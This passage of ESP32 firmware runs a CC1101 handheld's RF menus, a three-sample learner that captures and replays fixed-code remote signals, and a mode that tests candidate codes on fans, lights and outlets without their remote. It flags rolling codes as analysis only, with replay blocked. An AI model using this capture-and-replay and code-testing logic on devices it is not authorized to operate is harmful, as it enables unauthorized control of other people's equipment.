  lv_label_set_text(subtitle_label, subtitle);
  lv_obj_set_width(subtitle_label, width - 18);
  lv_label_set_long_mode(subtitle_label, LV_LABEL_LONG_WRAP);
  lv_obj_set_style_text_color(subtitle_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(subtitle_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(subtitle_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(subtitle_label, LV_ALIGN_BOTTOM_MID, 0, height >= 90 ? -14 : -8);

  lv_obj_t *accent = lv_obj_create(card);
  lv_obj_set_size(accent, width - 24, 3);
  lv_obj_align(accent, LV_ALIGN_TOP_MID, 0, 5);
  lv_obj_set_style_bg_color(accent, lv_color_hex(color), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(accent, LV_OPA_80, LV_PART_MAIN);
  lv_obj_set_style_border_width(accent, 0, LV_PART_MAIN);
  lv_obj_set_style_radius(accent, 2, LV_PART_MAIN);
  lv_obj_clear_flag(accent, LV_OBJ_FLAG_CLICKABLE);
  return card;
}


void create_rf_screen() {
  rf_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(rf_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(rf_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(rf_screen, true);
  create_header(rf_screen, "RF");

  create_rf_menu_tile(15, 86, 140, 104, "SCAN SIGNAL", "Live spectrum\nand waterfall",
                      COLOR_RF, open_rf_scanner);
  create_rf_menu_tile(165, 86, 140, 104, "LEARN REMOTE", "Copy buttons from\nyour remote",
                      COLOR_GREEN, open_known);
  create_rf_menu_tile(15, 198, 140, 104, "FIND CONTROLS", "No remote? Try\nsupported devices",
                      COLOR_SETTINGS, open_discovery);
  create_rf_menu_tile(165, 198, 140, 104, "SAVED REMOTES", "Open controls you\nalready saved",
                      COLOR_SAVED, open_saved);

  create_rf_menu_tile(15, 310, 290, 64, "RF ANALYZER", "Inspect waveform, timing, and repeats",
                      COLOR_RF, open_rf_scope);
  create_button(rf_screen, 70, 394, 180, 30, "<  HOME", COLOR_RF, go_home);
  create_footer(rf_screen);
}


// ============================================================
// CREATE RF DISCOVERY SCREEN
// ============================================================

void create_rf_discovery_screen_legacy() {

  rf_discovery_screen =
    lv_obj_create(NULL);


  lv_obj_set_style_bg_color(
    rf_discovery_screen,
    lv_color_hex(COLOR_BG),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    rf_discovery_screen,
    LV_OPA_COVER,
    LV_PART_MAIN
  );

  create_cyber_background(rf_discovery_screen, true);


  create_header(
    rf_discovery_screen,
    "FIND DEVICE CONTROLS"
  );


  discovery_category_label =
    lv_label_create(rf_discovery_screen);


  lv_obj_set_style_text_color(
    discovery_category_label,
    lv_color_hex(COLOR_TEXT),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    discovery_category_label,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_align(
    discovery_category_label,
    LV_ALIGN_TOP_MID,
    0,
    94
  );


  create_button(
    rf_discovery_screen,
    20,
    112,
    135,
    35,
    "UNKNOWN",
    COLOR_RF,
    discovery_unknown
  );


  create_button(
    rf_discovery_screen,
    165,
    112,
    135,
    35,
    "OUTLET",
    COLOR_GREEN,
    discovery_outlet
  );


  create_button(
    rf_discovery_screen,
    20,
    151,
    135,
    35,
    "LIGHT",
    COLOR_SETTINGS,
    discovery_light
  );


  create_button(
    rf_discovery_screen,
    165,
    151,
    135,
    35,
    "CEILING FAN",
    COLOR_SAVED,
    open_dip_fan_discovery
  );


  create_button(
    rf_discovery_screen,
    20,
    190,
    280,
    32,
    "PROJECTOR",
    COLOR_IR,
    discovery_projector
  );


  discovery_candidate_label =
    lv_label_create(rf_discovery_screen);


  lv_obj_set_style_text_color(
    discovery_candidate_label,
    lv_color_hex(COLOR_RF),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    discovery_candidate_label,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_align(
    discovery_candidate_label,
    LV_ALIGN_TOP_MID,
    0,
    230
  );


  discovery_hint_label =
    lv_label_create(rf_discovery_screen);


  lv_obj_set_style_text_color(
    discovery_hint_label,
    lv_color_hex(COLOR_MUTED),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    discovery_hint_label,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_set_style_text_align(
    discovery_hint_label,
    LV_TEXT_ALIGN_CENTER,
    LV_PART_MAIN
  );


  lv_obj_align(
    discovery_hint_label,
    LV_ALIGN_TOP_MID,
    0,
    265
  );


  create_button(
    rf_discovery_screen,
    20,
    302,
    135,
    34,
    "AUTO DETECT",
    COLOR_GREEN,
    discovery_scan_profile
  );


  create_button(
    rf_discovery_screen,
    165,
    302,
    135,
    34,
    "TEST CANDIDATE",
    COLOR_RF,
    discovery_test_candidate
  );


  create_button(
    rf_discovery_screen,
    15,
    346,
    88,
    34,
    "YES",
    COLOR_GREEN,
    discovery_response_yes
  );


  create_button(
    rf_discovery_screen,
    116,
    346,
    88,
    34,
    "NO",
    COLOR_SETTINGS,
    discovery_response_no
  );


  create_button(
    rf_discovery_screen,
    217,
    346,
    88,
    34,
    "STOP",
    COLOR_RED,
    discovery_stop
  );


  create_button(
    rf_discovery_screen,
    70,
    392,
    180,
    32,
    "BACK TO RF MENU",
    COLOR_RF,
    discovery_stop
  );


  create_footer(
    rf_discovery_screen
  );


  update_discovery_screen();
}


void create_rf_discovery_screen() {
  rf_discovery_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(rf_discovery_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(rf_discovery_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(rf_discovery_screen, true);
  create_header(rf_discovery_screen, "FIND DEVICE CONTROLS");

  lv_obj_t *info = lv_label_create(rf_discovery_screen);
  lv_obj_set_width(info, 294);
  lv_label_set_text(info,
    "Use this when you DON'T have the original remote.\n"
    "Ripper tests only supported fixed-code signals.\n"
    "Watch the device; nothing saves until you confirm.");
  lv_obj_set_style_text_color(info, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(info, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(info, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(info, LV_ALIGN_TOP_MID, 0, 86);

  lv_obj_t *question = lv_label_create(rf_discovery_screen);
  lv_label_set_text(question, "WHAT ARE YOU TRYING TO CONTROL?");
  lv_obj_set_style_text_color(question, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(question, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_align(question, LV_ALIGN_TOP_MID, 0, 164);

  create_button(rf_discovery_screen, 20, 205, 135, 47, "CEILING FAN",
                COLOR_SAVED, discovery_fan);
  create_button(rf_discovery_screen, 165, 205, 135, 47, "LIGHT",
                COLOR_SETTINGS, discovery_light);
  create_button(rf_discovery_screen, 20, 264, 280, 47, "OUTLET / SWITCH",
                COLOR_GREEN, discovery_outlet);
  create_button(rf_discovery_screen, 20, 323, 280, 47, "OTHER / UNKNOWN",
                COLOR_RF, discovery_unknown);
  create_button(rf_discovery_screen, 70, 392, 180, 32, "BACK TO RF MENU",
                COLOR_RF, discovery_stop);
  create_footer(rf_discovery_screen);
}


// ============================================================
// UNIVERSAL REMOTE FUNCTIONS
// ============================================================

void open_universal_remote(
  lv_event_t *e
);

void refresh_universal_remote();


// ============================================================
// ADD UNIVERSAL BUTTON
// ============================================================

uint32_t rf_capture_fingerprint(uint16_t edges, uint16_t *anchor_out) {
  uint16_t anchor = 0;
  uint32_t longest = 0;
  for (uint16_t i = 0; i < edges; i++) {
    if (rf_capture_durations[i] > longest) {
      longest = rf_capture_durations[i];
      anchor = i;
    }
  }

  // Begin comparison after the longest interval. It is a stable delimiter in
  // repeated fixed-code bursts, unlike the arbitrary instant capture began.
  uint32_t hash = 2166136261UL;
  uint16_t compare_edges = edges < 256 ? edges : 256;
  for (uint16_t i = 0; i < compare_edges; i++) {
    uint16_t index = (anchor + 1 + i) % edges;
    uint16_t bucket = (uint16_t)(rf_capture_durations[index] / 25U);
    hash ^= bucket;
    hash *= 16777619UL;
  }
  if (anchor_out != NULL) *anchor_out = anchor;
  return hash;
}


void start_next_rf_learning_sample(lv_event_t *e) {
  if (start_rf_capture()) {
    if (rf_capture_instruction_label != NULL && rf_guided_learning_active &&
        current_step_index < current_step_count) {
      if (rf_rolling_confirmation_pending) {
        lv_label_set_text_fmt(rf_capture_instruction_label,
                              "%s: %s\n\nPossible changing code. Press the\nSAME button three more times",
                              current_device_name, current_steps[current_step_index]);
      } else {
        lv_label_set_text_fmt(rf_capture_instruction_label,
                              "%s: %s\n\nWait briefly, then press the\nSAME button three separate times",
                              current_device_name, current_steps[current_step_index]);
      }
    } else if (rf_capture_instruction_label != NULL && rf_rolling_confirmation_pending) {
      lv_label_set_text(rf_capture_instruction_label,
                        "POSSIBLE CHANGING CODE\n\nPress the SAME button\nthree more separate times");
    }
    if (rf_capture_replay_button != NULL) {
      lv_label_set_text(lv_obj_get_child(rf_capture_replay_button, 0), "NEXT SAMPLE");
    }
    if (rf_capture_replay_button != NULL) {
      lv_obj_add_flag(rf_capture_replay_button, LV_OBJ_FLAG_HIDDEN);
    }
  if (rf_capture_state_label != NULL) {
      lv_label_set_text_fmt(rf_capture_state_label,
                            rf_rolling_confirmation_pending ?
                              "CONFIRM %d / 3\nPRESS, THEN RELEASE" :
                              "SAMPLE %d / 3\nPRESS, THEN RELEASE",
                            rf_learn_sample_count + 1);
    }
    set_status("LISTENING", COLOR_RF);
  } else {
    set_status("CC1101 NOT READY", COLOR_RED);
  }
}

void add_universal_button(
  lv_event_t *e
) {

  if (universal_remote_loaded_from_save) {
    set_status("SAVED REMOTE IS READ-ONLY", COLOR_MUTED);
    return;
  }

  if (
    universal_button_count >=
    MAX_UNIVERSAL_BUTTONS
  ) {

    set_status(
      "REMOTE FULL",
      COLOR_RED
    );

    return;
  }


  rf_learn_sample_count = 0;
  rf_rolling_confirmation_pending = false;
  lv_scr_load(universal_capture_screen);
  if (rf_capture_state_label != NULL) {
    lv_label_set_text(rf_capture_state_label,
                      "HOLD THE REMOTE BUTTON\nAUTO-DETECTING SIGNAL");
  }
  if (rf_capture_instruction_label != NULL) {
    lv_label_set_text(rf_capture_instruction_label,
                      "Keep the remote close and hold the\nbutton until listening begins");
  }
  set_status("AUTO-DETECTING RF SIGNAL", COLOR_RF);
  lv_timer_handler();
  // Select the strongest usable internal receive preset before the first
  // learning sample. The user never needs to know or choose a radio profile.
  scan_rf_profiles();
  start_next_rf_learning_sample(e);
}


// ============================================================
// COMPLETE RAW CAPTURE TEST
// ============================================================

void finish_universal_capture(
  lv_event_t *e
) {
  // The analyzer reuses the proven RMT capture path, but it only visualizes
  // the received envelope. Keep it independent from the three-sample learner
  // so inspecting a signal never changes a saved remote or learning session.
  if (rf_scope_capture_mode) {
    finish_rf_scope_pulse_capture();
    return;
  }

  if (rf_rmt_ready && rmtReceiveCompleted(CC1101_GDO0)) {
    rf_capture_edge_count = 0;
    for (size_t i = 0; i < rf_rmt_symbol_count && rf_capture_edge_count + 1 < RF_CAPTURE_MAX_EDGES; i++) {
      if (rf_rmt_symbols[i].duration0 >= RF_CAPTURE_MIN_PULSE_US) { rf_capture_durations[rf_capture_edge_count] = rf_rmt_symbols[i].duration0; rf_capture_levels[rf_capture_edge_count++] = rf_rmt_symbols[i].level0; }
      if (rf_rmt_symbols[i].duration1 >= RF_CAPTURE_MIN_PULSE_US) { rf_capture_durations[rf_capture_edge_count] = rf_rmt_symbols[i].duration1; rf_capture_levels[rf_capture_edge_count++] = rf_rmt_symbols[i].level1; }
    }
  }
  uint16_t edges = rf_capture_edge_count;
  bool carrier_seen = rf_capture_carrier_seen;
  bool used_rmt = rf_rmt_ready;
  float peak_rssi = rf_capture_peak_rssi;
  stop_rf_capture();
  Serial.printf("RF capture test ended with %u filtered pulse edges (carrier=%s peak=%.1f dBm)\n", edges, carrier_seen ? "YES" : "NO", peak_rssi);
  if (((!used_rmt && !carrier_seen) || edges < 20)) {
    set_status("NO USABLE RF SIGNAL", COLOR_RED);
    if (rf_capture_state_label != NULL) {
      lv_label_set_text(
        rf_capture_state_label,
        !carrier_seen ? "NO RF CARRIER - PRESS REMOTE" :
        "NO VALID BUTTON SIGNAL - TRY AGAIN CLOSER"
      );
    }
    return;
  }

  Serial.printf("RF capture test received %u pulse edges\n", edges);
  uint32_t shortest = UINT32_MAX;
  uint32_t longest = 0;
  for (uint16_t i = 0; i < edges; i++) {
    uint32_t duration = rf_capture_durations[i];
    if (duration < shortest) shortest = duration;
    if (duration > longest) longest = duration;
  }
  Serial.printf("RF pulse timing range: %lu to %lu us\n", (unsigned long)shortest, (unsigned long)longest);
  print_hunter_capture_dump(edges);
  print_hunter_capture_levels(edges);
  print_hunter_normalized_bits(edges);
  print_hunter_stable_tail(edges);
  print_rf_frame_candidates(edges);
  detect_fixed_code_pulse_pairs(edges);
  analyze_generic_ook_candidate(edges);

  RfLearnFrame candidate = {};
  if (!build_rf_learn_frame_from_capture(candidate)) {
    set_status("RF FRAME TOO LONG OR NOISY", COLOR_RED);
    if (rf_capture_state_label != NULL) {
      lv_label_set_text(rf_capture_state_label,
                        "FRAME TOO LONG / NOISY\nPRESS + RELEASE ONCE, CLOSER");
    }
    if (rf_capture_replay_button != NULL) {
      lv_label_set_text(lv_obj_get_child(rf_capture_replay_button, 0), "TRY AGAIN");
      lv_obj_clear_flag(rf_capture_replay_button, LV_OBJ_FLAG_HIDDEN);
    }
    return;
  }
  const float signal_rise = peak_rssi - rf_capture_baseline_rssi;
  rf_learn_frames[rf_learn_sample_count] = candidate;
  rf_learn_sample_clean[rf_learn_sample_count] = carrier_seen &&
    peak_rssi >= RF_CAPTURE_MIN_VALID_RSSI_DBM &&
    signal_rise >= RF_CAPTURE_MIN_RSSI_RISE_DB;
  rf_learn_sample_count++;
  const char *quality_name = rf_capture_quality_name(peak_rssi, rf_capture_baseline_rssi);
  Serial.printf("RF learn sample %u normalized: %u edges, profile=%s\n",
                rf_learn_sample_count, candidate.edge_count,
                RF_PROFILES[safe_rf_profile_index()].name);
  Serial.printf("RF capture quality: %s, peak=%.1f dBm, noise=%.1f dBm, rise=%.1f dB, repeats=%u, agreement=%u%%\n",
                quality_name, peak_rssi, rf_capture_baseline_rssi, signal_rise,
                rf_capture_repeat_count, rf_capture_repeat_quality);
  rf_capture_ready = false;
  set_status("SYSTEM READY", COLOR_READY);
  if (rf_capture_state_label != NULL) {
    if (rf_learn_sample_count < RF_LEARN_SAMPLE_COUNT) {
      lv_label_set_text_fmt(rf_capture_state_label,
                            "SAMPLE %u SAVED | %s\nRSSI %.0f  NOISE %.0f  +%.0f dB\nREPEATS %u  MATCH %u%%\nTAP NEXT SAMPLE",
                            rf_learn_sample_count, quality_name, peak_rssi,
                            rf_capture_baseline_rssi, signal_rise,
                            rf_capture_repeat_count, rf_capture_repeat_quality);
    } else {
      const bool match_01 = rf_learn_frames_match(rf_learn_frames[0], rf_learn_frames[1]);
      const bool match_02 = rf_learn_frames_match(rf_learn_frames[0], rf_learn_frames[2]);
      const bool match_12 = rf_learn_frames_match(rf_learn_frames[1], rf_learn_frames[2]);
      const bool matched = match_01 && match_02 && match_12;
      if (matched && universal_button_count < MAX_UNIVERSAL_BUTTONS) {
        rf_rolling_confirmation_pending = false;
        SavedRfRawCommand &saved = universal_working_rf_commands[universal_button_count];
        memset(&saved, 0, sizeof(saved));
        saved.valid = 2;  // Canonical single frame; replay sends a short repeat burst.
        saved.profile_index = rf_profile_index;
        saved.first_level = rf_learn_frames[0].first_level;
        saved.edge_count = rf_learn_frames[0].edge_count;
        for (uint16_t i = 0; i < saved.edge_count; i++) {
          // A median rejects one distorted edge instead of allowing it to
          // pull the saved waveform away from the two clean captures.
          saved.durations_us[i] = rf_median_duration(
            rf_learn_frames[0].durations_us[i],
            rf_learn_frames[1].durations_us[i],
            rf_learn_frames[2].durations_us[i]
          );
        }
        if (rf_guided_learning_active && current_step_index < current_step_count) {
          strncpy(universal_button_names[universal_button_count], current_steps[current_step_index],
                  sizeof(universal_button_names[universal_button_count]) - 1);
        } else {
          snprintf(universal_button_names[universal_button_count],
                   sizeof(universal_button_names[universal_button_count]),
                   "BUTTON %u", universal_button_count + 1);
        }
        universal_button_count++;
        rf_learn_sample_count = 0;
        memset(rf_learn_frames, 0, sizeof(rf_learn_frames));
        memset(rf_learn_sample_clean, 0, sizeof(rf_learn_sample_clean));
        lv_label_set_text(rf_capture_state_label,
                          "VALIDATED RF BUTTON SAVED\nADD ANOTHER OR FINISH REMOTE");
        if (rf_guided_learning_active) {
          current_step_index++;
          update_known_capture_screen();
          lv_scr_load(known_capture_screen);
          set_status(current_step_index >= current_step_count ?
                     "GUIDED COPY COMPLETE" : "BUTTON SAVED", COLOR_GREEN);
          Serial.println("RF guided button validated and saved");
          return;
        }
        if (rf_button_name_screen == NULL) create_rf_button_name_screen();
        lv_textarea_set_text(rf_button_name_textarea, "");
        lv_scr_load(rf_button_name_screen);
        set_status("NAME THIS BUTTON", COLOR_GREEN);
        Serial.println("RF fixed-code button validated and added to working remote");
        return;
      }

      uint8_t changing_code_similarity = 0;
      const bool all_samples_clean = rf_learn_sample_clean[0] &&
                                     rf_learn_sample_clean[1] &&
                                     rf_learn_sample_clean[2];
      if (!match_01 && !match_02 && !match_12 && all_samples_clean &&
          analyze_changing_code_candidate(rf_learn_frames,
                                          &changing_code_similarity)) {
        bool confirmation_matches = rf_rolling_confirmation_pending &&
          rf_rolling_first_edge_count == rf_learn_frames[0].edge_count &&
          rf_rolling_first_level == rf_learn_frames[0].first_level;
        if (confirmation_matches) {
          for (uint8_t sample = 0; sample < RF_LEARN_SAMPLE_COUNT; sample++) {
            const uint32_t fingerprint = rf_learn_frame_fingerprint(rf_learn_frames[sample]);
            uint8_t best_cross_set_similarity = 0;
            for (uint8_t first = 0; first < RF_LEARN_SAMPLE_COUNT; first++) {
              if (fingerprint == rf_rolling_first_fingerprints[first]) {
                confirmation_matches = false;
              }
              const uint8_t similarity = rf_learn_frame_similarity(
                rf_rolling_first_frames[first], rf_learn_frames[sample]);
              if (similarity > best_cross_set_similarity) {
                best_cross_set_similarity = similarity;
              }
            }
            if (best_cross_set_similarity < 55) confirmation_matches = false;
          }
        }

        if (!rf_rolling_confirmation_pending) {
          rf_rolling_first_edge_count = rf_learn_frames[0].edge_count;
          rf_rolling_first_level = rf_learn_frames[0].first_level;
          for (uint8_t sample = 0; sample < RF_LEARN_SAMPLE_COUNT; sample++) {
            rf_rolling_first_frames[sample] = rf_learn_frames[sample];
            rf_rolling_first_fingerprints[sample] =
              rf_learn_frame_fingerprint(rf_learn_frames[sample]);
          }
          rf_rolling_confirmation_pending = true;
          rf_learn_sample_count = 0;
          memset(rf_learn_frames, 0, sizeof(rf_learn_frames));
          memset(rf_learn_sample_clean, 0, sizeof(rf_learn_sample_clean));
          lv_label_set_text_fmt(
            rf_capture_state_label,
            "POSSIBLE CHANGING CODE\nSTRUCTURE MATCH %u%%\nCAPTURE 3 MORE PRESSES TO CONFIRM",
            changing_code_similarity
          );
          if (rf_capture_replay_button != NULL) {
            lv_label_set_text(lv_obj_get_child(rf_capture_replay_button, 0),
                              "START CONFIRMATION");
            lv_obj_clear_flag(rf_capture_replay_button, LV_OBJ_FLAG_HIDDEN);
          }
          set_status("CHANGING CODE CHECK NEEDED", COLOR_SETTINGS);
          Serial.println("RF changing-code candidate needs a second three-press confirmation");
          return;
        }

        char likely_protocol[28] = "UNKNOWN CHANGING CODE";
        uint8_t protocol_confidence = 0;
        if (confirmation_matches) {
          identify_dynamic_protocol(rf_rolling_first_frames, rf_learn_frames,
                                    likely_protocol, sizeof(likely_protocol),
                                    &protocol_confidence);
        }
        const bool analysis_saved = confirmation_matches &&
          store_changing_code_analysis(rf_learn_frames, changing_code_similarity,
                                       likely_protocol, protocol_confidence);
        rf_rolling_confirmation_pending = false;
        rf_learn_sample_count = 0;
        memset(rf_learn_frames, 0, sizeof(rf_learn_frames));
        memset(rf_learn_sample_clean, 0, sizeof(rf_learn_sample_clean));
        if (confirmation_matches) {
          lv_label_set_text_fmt(
            rf_capture_state_label,
            "CHANGING-CODE PATTERN CONFIRMED\n%s | PROFILE %u%%\nANALYSIS %s | REPLAY BLOCKED",
            likely_protocol, protocol_confidence,
            analysis_saved ? "SAVED" : "SAVE FAILED"
          );
        } else {
          lv_label_set_text(rf_capture_state_label,
                            "ROLLING CODE NOT CONFIRMED\nCAPTURES WERE UNSTABLE OR NOISY\nNOT SAVED AS A ROLLING CODE");
        }
        if (rf_capture_replay_button != NULL) {
          lv_label_set_text(lv_obj_get_child(rf_capture_replay_button, 0),
                            "ANALYZE AGAIN");
        }
        set_status(confirmation_matches ? "CHANGING CODE - ANALYSIS ONLY" :
                   "UNSTABLE RF - TRY AGAIN",
                   confirmation_matches ? COLOR_SAVED : COLOR_RED);
        Serial.printf("RF changing-code confirmation: %s, similarity=%u%%, likely protocol=%s (%u%%); replay blocked\n",
                      confirmation_matches ? "CONFIRMED" : "REJECTED",
                      changing_code_similarity, likely_protocol, protocol_confidence);
      }

      // Preserve a matching pair and replace only the outlier. This keeps one
      // noisy press from throwing away two already validated samples.
      else if (match_01 || match_02 || match_12) {
        if (match_02) {
          rf_learn_frames[1] = rf_learn_frames[2];
          rf_learn_sample_clean[1] = rf_learn_sample_clean[2];
        } else if (match_12) {
          rf_learn_frames[0] = rf_learn_frames[1];
          rf_learn_frames[1] = rf_learn_frames[2];
          rf_learn_sample_clean[0] = rf_learn_sample_clean[1];
          rf_learn_sample_clean[1] = rf_learn_sample_clean[2];
        }
        memset(&rf_learn_frames[2], 0, sizeof(rf_learn_frames[2]));
        rf_learn_sample_clean[2] = false;
        rf_learn_sample_count = 2;
        lv_label_set_text(rf_capture_state_label,
                          "TWO SAMPLES MATCH\nREPLACE THE ONE BAD SAMPLE");
        if (rf_capture_replay_button != NULL) {
          lv_label_set_text(lv_obj_get_child(rf_capture_replay_button, 0), "RECAPTURE THIRD");
        }
        Serial.println("RF learner retained matching pair; requesting one replacement sample");
      } else {
        const bool confirmation_failed = rf_rolling_confirmation_pending;
        rf_rolling_confirmation_pending = false;
        rf_learn_sample_count = 0;
        memset(rf_learn_frames, 0, sizeof(rf_learn_frames));
        memset(rf_learn_sample_clean, 0, sizeof(rf_learn_sample_clean));
        lv_label_set_text(rf_capture_state_label, confirmation_failed ?
                          "ROLLING CODE NOT CONFIRMED\nSIGNAL LOOKED UNSTABLE OR NOISY\nTRY THE SAME BUTTON AGAIN" :
                          "NO TWO SAMPLES MATCHED\nTRY AGAIN, SAME BUTTON");
        if (rf_capture_replay_button != NULL) {
          lv_label_set_text(lv_obj_get_child(rf_capture_replay_button, 0), "TRY AGAIN");
        }
      }
    }
  }
  if (rf_capture_replay_button != NULL && rf_learn_sample_count < RF_LEARN_SAMPLE_COUNT) {
    lv_obj_clear_flag(rf_capture_replay_button, LV_OBJ_FLAG_HIDDEN);
  }
}


void cancel_universal_capture(lv_event_t *e) {
  stop_rf_capture();
  rf_rolling_confirmation_pending = false;
  if (rf_guided_learning_active) {
    update_known_capture_screen();
    lv_scr_load(known_capture_screen);
    set_status("LEARNING PAUSED", COLOR_MUTED);
    return;
  }
  open_universal_remote(e);
}


void replay_universal_capture(lv_event_t *e) {
  set_status("TRANSMITTING", COLOR_SETTINGS);
  if (replay_rf_capture_once()) {
    set_status("SYSTEM READY", COLOR_READY);
  } else {
    set_status("NO CAPTURE READY", COLOR_RED);
  }
}


// ============================================================
// CREATE UNIVERSAL CAPTURE SCREEN
// ============================================================

void create_universal_capture_screen() {

  universal_capture_screen =
    lv_obj_create(NULL);


  lv_obj_set_style_bg_color(
    universal_capture_screen,
    lv_color_hex(COLOR_BG),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    universal_capture_screen,
    LV_OPA_COVER,
    LV_PART_MAIN
  );

  create_cyber_background(universal_capture_screen, true);


  create_header(
    universal_capture_screen,
    "COPY RF BUTTON"
  );


  rf_capture_instruction_label =
    lv_label_create(
      universal_capture_screen
    );


  lv_label_set_text(
    rf_capture_instruction_label,
    "Wait briefly, then press the\nSAME button three separate times"
  );


  lv_obj_set_style_text_color(
    rf_capture_instruction_label,
    lv_color_hex(COLOR_TEXT),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    rf_capture_instruction_label,
    &lv_font_montserrat_16,
    LV_PART_MAIN
  );


  lv_obj_set_style_text_align(
    rf_capture_instruction_label,
    LV_TEXT_ALIGN_CENTER,
    LV_PART_MAIN
  );


  lv_obj_align(
    rf_capture_instruction_label,
    LV_ALIGN_TOP_MID,
    0,
    145
  );


  rf_capture_state_label =
    lv_label_create(
      universal_capture_screen
    );


  lv_label_set_text(rf_capture_state_label, "SAMPLE 1 / 3\nPRESS, THEN RELEASE");


  lv_obj_set_style_text_color(
    rf_capture_state_label,
    lv_color_hex(COLOR_RF),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    rf_capture_state_label,
    &lv_font_montserrat_16,
    LV_PART_MAIN
  );


  lv_obj_align(
    rf_capture_state_label,
    LV_ALIGN_CENTER,
    0,
    35
  );


  lv_obj_t *capture_note = lv_label_create(universal_capture_screen);
  lv_label_set_text(capture_note,
                    "Signal settings are selected automatically\nKeep the remote close while learning");
  lv_obj_set_style_text_color(capture_note, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(capture_note, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(capture_note, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(capture_note, LV_ALIGN_TOP_MID, 0, 290);


  rf_capture_replay_button = create_button(
    universal_capture_screen,
    55,
    330,
    210,
    42,
    "NEXT SAMPLE",
    COLOR_RF,
    start_next_rf_learning_sample
  );
  lv_obj_add_flag(rf_capture_replay_button, LV_OBJ_FLAG_HIDDEN);


  create_button(
    universal_capture_screen,
    55,
    382,
    210,
    32,
    "STOP LEARNING",
    COLOR_RED,
    cancel_universal_capture
  );


  create_footer(
    universal_capture_screen
  );
}


// ============================================================
// REFRESH UNIVERSAL REMOTE
// ============================================================

void save_universal_remote(lv_event_t *e) {
  if (universal_button_count == 0) {
    set_status("ADD A BUTTON FIRST", COLOR_MUTED);
    return;
  }

  lv_textarea_set_text(universal_name_textarea, "");
  lv_scr_load(universal_name_screen);
  set_status("NAME YOUR REMOTE", COLOR_GREEN);
}


void commit_universal_save(lv_event_t *e) {
  if (saved_remote_count >= MAX_SAVED_REMOTES) {
    set_status("SAVED REMOTES FULL", COLOR_RED);
    return;
  }

  uint8_t saved_index = saved_remote_count;
  SavedRemoteRecord &record = saved_remotes[saved_remote_count++];
  memset(&record, 0, sizeof(record));
  memset(&saved_rf_layouts[saved_index], 0, sizeof(SavedRemoteLayout));
  memcpy(saved_rf_raw_commands[saved_index], universal_working_rf_commands,
         sizeof(universal_working_rf_commands));
  record.magic = SAVED_REMOTE_MAGIC;
  const char *entered_name = lv_textarea_get_text(universal_name_textarea);
  if (strlen(entered_name) == 0) {
    snprintf(record.name, sizeof(record.name), "UNIVERSAL %d", saved_remote_count);
  } else {
    strncpy(record.name, entered_name, sizeof(record.name) - 1);
    record.name[sizeof(record.name) - 1] = '\0';
  }
  strncpy(record.category,
          rf_smart_learn_category != NULL ? rf_smart_learn_category : "UNKNOWN",
          sizeof(record.category) - 1);
  record.category[sizeof(record.category) - 1] = '\0';
  record.candidate_index = universal_button_count;
  record.has_anchor = true;
  record.button_count = universal_button_count;
  memcpy(record.button_names, universal_button_names, sizeof(universal_button_names));
  persist_saved_remotes();
  persist_saved_remote_layouts();
  persist_saved_rf_raw_command_bank(saved_index);
  refresh_saved_summary();

  universal_button_count = 0;
  memset(universal_button_names, 0, sizeof(universal_button_names));
  memset(universal_working_rf_commands, 0, sizeof(universal_working_rf_commands));
  universal_remote_loaded_from_save = false;
  refresh_universal_remote();
  open_saved(e);
  set_status("REMOTE SAVED", COLOR_GREEN);
}


void open_latest_saved_remote(lv_event_t *e) {
  if (saved_remote_count == 0) {
    set_status("NO SAVED REMOTES", COLOR_MUTED);
    return;
  }

  if (selected_saved_index < 0 || selected_saved_index >= saved_remote_count) {
    selected_saved_index = 0;
  }
  SavedRemoteRecord &record = saved_remotes[selected_saved_index];
  if (record.button_count == 0 || record.button_count > MAX_UNIVERSAL_BUTTONS) {
    set_status("NO BUTTON DATA IN REMOTE", COLOR_MUTED);
    return;
  }

  universal_button_count = record.button_count;
  memcpy(universal_button_names, record.button_names, sizeof(universal_button_names));
  universal_remote_loaded_from_save = true;
  refresh_universal_remote();
  lv_scr_load(universal_remote_screen);
  set_status("SAVED REMOTE OPENED", COLOR_GREEN);
}


void start_new_universal_remote(lv_event_t *e) {
  universal_button_count = 0;
  memset(universal_button_names, 0, sizeof(universal_button_names));
  memset(universal_working_rf_commands, 0, sizeof(universal_working_rf_commands));
  universal_remote_loaded_from_save = false;
  rf_rolling_confirmation_pending = false;
  refresh_universal_remote();
  lv_scr_load(universal_remote_screen);
  set_status("NEW UNIVERSAL REMOTE", COLOR_RF);
}


void begin_rf_smart_learn(const char *category, lv_event_t *e) {
  if (!cc1101_ready) {
    set_status("CC1101 NOT READY", COLOR_RED);
    return;
  }
  rf_smart_learn_category = category;
  rf_guided_learning_active = false;
